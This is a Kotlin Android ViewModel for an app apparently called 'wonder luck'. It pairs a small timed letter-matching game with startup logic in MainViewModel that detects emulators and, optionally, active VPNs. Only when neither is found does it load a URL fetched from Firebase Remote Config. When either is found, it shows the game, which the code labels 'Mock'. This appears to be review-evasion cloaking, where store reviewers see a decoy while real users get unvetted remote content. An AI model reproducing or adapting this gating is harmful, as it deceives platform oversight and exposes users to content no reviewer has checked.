package com.wonder.luck.ui

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.wonder.luck.data.egyptAlfa
import com.wonder.luck.domain.Keeper
import com.wonder.luck.domain.Service
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class MainViewModel @Inject constructor(
    private val service: Service,
    private val keeper: Keeper
) : ViewModel() {
    private val _state = MutableStateFlow(MainState())
    val state = _state.asStateFlow()

    private var job: Job? = null

    init {
        getFromLocal()
    }

    private fun getFromLocal() {
        if (service.checkIsEmu()) {
            game()
        } else {
            val pathUrl = keeper.getSharedUrl()
            val sharedTo = keeper.getSharedTo()
            if (pathUrl.isNullOrEmpty()) {
                getRemoteData()
            } else {
                setStatusByChecking(
                    url = pathUrl,
                    isCheckVpn = sharedTo
                )
            }
        }
    }

    private fun getRemoteData() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(3600)
            .build()
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val isCheckedVpn = remoteConfig.getBoolean("to")
                    val resultUrl = remoteConfig.getString("url")
                    keeper.setSharedUrl(url = resultUrl)
                    keeper.setSharedTo(isCheckedVpn)
                    setStatusByChecking(
                        url = resultUrl,
                        isCheckVpn = isCheckedVpn
                    )
                } else {
                    game()
                }
            }
    }


    private fun setStatusByChecking(url: String, isCheckVpn: Boolean) {
        if (isCheckVpn) {
            if (service.checkIsEmu() || url == "" || service.vpnActive()) {
                game()
            } else {
                _state.value.copy(
                    status = ApplicationStatus.Succsess(url = url)
                )
                    .updateStateUI()

            }
        } else {
            viewModelScope.launch {
                if (service.checkIsEmu() || url == "") {
                    game()
                } else {
                    _state.value.copy(
                        status = ApplicationStatus.Succsess(url = url)
                    )
                        .updateStateUI()

                }
            }
        }
    }

    private fun game() {

        _state.value.copy(
            status = ApplicationStatus.Mock,
            bestScore = keeper.getBestScore() ?: 0
        )
            .updateStateUI()
    }

    fun onEvent(mainEvent: MainEvent) {
        when (mainEvent) {
            MainEvent.EndGame -> pauseGame()
            MainEvent.StartGame -> startGame()
            is MainEvent.getAnswer -> getAnswer(mainEvent.chooseInt)
        }
    }

    private fun startGame() {
        val currentAlfa = egyptAlfa.shuffled()
        _state.value.copy(
            gameStatus = GameStatus.Play,
            bestScore = keeper.getBestScore() ?: 0,
            score = 0,
            alfa = currentAlfa,
            single = currentAlfa.random()
        )
            .updateStateUI()
        job?.cancel()
        job = viewModelScope.launch {
            for (i in _state.value.leftTime downTo 0 step 1) {
                _state.value.copy(
                    leftTime = i
                )
                    .updateStateUI()
                delay(1000)
            }
            if (_state.value.score > _state.value.bestScore) {
                keeper.setBestScore(_state.value.score)
            }
            _state.value.copy(
                gameStatus = GameStatus.Pause,
                leftTime = 120,
            )
                .updateStateUI()

        }
    }

    private fun pauseGame() {
        job?.cancel()
        _state.value.copy(
            gameStatus = GameStatus.Pause,
            leftTime = 120,
        )
            .updateStateUI()
    }

    private fun getAnswer(index: Int) {
        if (_state.value.alfa[index] == _state.value.single) {
            _state.value.copy(
                score = _state.value.score+1,
                single = _state.value.alfa.random()
            )
                .updateStateUI()
        }
    }

    private fun MainState.updateStateUI() {
        _state.update {
            this
        }
    }
}